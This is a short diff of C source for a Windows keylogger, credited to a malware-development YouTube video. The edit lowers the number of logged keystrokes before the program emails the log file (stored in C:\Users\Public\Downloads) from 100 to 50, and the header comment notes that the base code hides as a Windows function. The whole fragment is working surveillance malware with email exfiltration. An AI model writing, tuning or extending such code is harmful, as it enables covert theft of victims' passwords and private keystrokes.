@@ -1,4 +1,4 @@
-// Inital keylogger base code which hides as a win function comes from S12 youtube video: https://www.youtube.com/watch?v=ceUVxeq4Eqk&ab_channel=S12-MalwareDevelopment
+// Keylogger hook code S12 youtube video: https://www.youtube.com/watch?v=ceUVxeq4Eqk&ab_channel=S12-MalwareDevelopment
 // email functionality written by z5410231
 
 #include <winsock2.h>
@@ -113,7 +113,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         TranslateMessage(&msg); //win32 function to translate keystrokes
         DispatchMessage(&msg); //win32 function.
 
-        if(keyCount == 100) {
+        if(keyCount == 50) {
             const char *file_path = "C:\\Users\\Public\\Downloads\\log.txt";
             send_email_with_attachment(file_path);
 
